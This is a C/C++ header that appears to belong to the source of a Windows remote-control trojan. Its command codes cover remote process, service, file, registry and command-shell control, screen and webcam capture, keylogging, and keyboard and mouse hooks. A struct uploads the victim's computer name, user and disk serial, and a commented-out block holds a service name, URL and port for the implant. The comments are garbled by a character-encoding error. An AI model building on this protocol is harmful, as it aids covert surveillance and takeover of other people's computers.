typedef struct tagSytemInit         //�ϴ�������Ϣ
{
	char computer[32];
	char user[32];
	char os[72];
	char processor[16];
	char mem[16];
	char version[16];
	char HDSerial[32];
}SYSTEMINIT;

typedef struct tagLinkInfo {       //�ͻ��˱��ֵ�������Ϣ
    SOCKET  s;
    string  strBindIp;
    u_short BindPort;
	
}LINKINFO,*LPLINKINFO;

typedef struct tagProcessInfo      //������Ϣ
{
	DWORD PID;
	char  ProcName[64]; //
	char  ProcPath[128]; //

}PROCESSINFO,*LPPROCESSINFO;

#define CMD_NULL            100   
#define CMD_PROCESS_MANAGE  101
#define CMD_SERVICE_MANAGE  102   
#define CMD_FILE_MANAGE     103
#define CMD_REG_MANAGE      104   
#define CMD_SHELL_MANAGE    105  
#define CMD_SCREEN_MANAGE   106
#define CMD_VIDEO_MANAGE    107
#define CMD_KEYLOG_MANAGE   108

#define CMD_PROCESS_KILL    109
#define CMD_SERVICE_DEL     110

#define CMD_FILE_GETSUBFILE 111
#define CMD_KEY_HOOK        112
#define CMD_MOUSE_HOOK      113
#define CMD_MOUSE_DBHOOK    114
#define CMD_KEY_CAD         115

#define CMD_MOUSE_RDBCLICK     116
#define CMD_MOUSE_LDBCLICK     117
#define CMD_GET_SCREEN_INFO    118
#define CMD_FILE_DEL           119
#define CMD_CMDSHELL           120
#define MY_END                 121
#define CMD_KEYLOG_STOP        122

#define CMD_RETRY              123

typedef struct tagCommand
{
	/////����IDֵ//////
	int wCmd;
	/////������ݴ�С//
	DWORD DataSize;
	char  tmp[32];
	char  szCurDir[260];
	BOOL  nRet;
	/////��Ļ�����Ҫ�Ĳ���//////
	CRect  rcArea;     //ͼ������
	int  nBits;        //��ɫλ��  //256 
	int  nArea;      //�̶���ȫ��   //��������  0)ȫ��   1)��ǰ���� 2)ָ������
	int  nCompress;  //�̶���JPEG   //ѹ����ʽ  0)��ѹ�� 1)Huffman  2)JPEG
	int  nJpegQ   ;  //�̶���80     //Jpeg ��Qֵ
	DWORD  dwBmpSize;     //ͼ���С
	DWORD  dwFileSize;    //�ļ���С
	DWORD  dwBmpInfoSize; //ͼ����Ϣ
	DWORD  dwHookFlags;   //���̡������Ϣ
	DWORD  dwHookParam1;
	DWORD  dwHookParam2;
	int     nCell;     //��̬�����־
	int    nDelay;    //ÿ����ʱ
}COMMAND,*LPCOMMAND;


/*
typedef struct tagDriver
{
   char szDriverName[500];
   char szDriverLabel[500];
//   UINT nDriverType;
}DRIVER,*LPDRIVER;
*/

typedef struct tagDriver
{
	char driver[8];
	int  drivertype;
	BOOL end;
}DRIVER;//Ӳ�̽ṹ��


typedef struct tagFileInfo
{
	BOOL invalidir;                       //��ЧĿ¼
	char filename[128];                   //�ļ���
	int  filesize;                        //�ļ���С
	int  begin;                           //��ʼλ��,���߳���
	int  stop;                            //����λ��,���߳���
	char time[32];                        //ʱ��
	BOOL isdirectory;                     //��Ŀ¼?
	BOOL next;						      //������һ��?
}FILEINFO;//�ļ���Ϣ�ṹ��

/*
struct MODIFY_DATA 
{
		unsigned int finder;
		TCHAR ws_svcname[32];
		TCHAR ws_svcdisplay[64];
		char ws_svcdesc[256];
		char url[256];
		int  port;
};*/

//extern MODIFY_DATA modify_data; //�ⲿ�ı���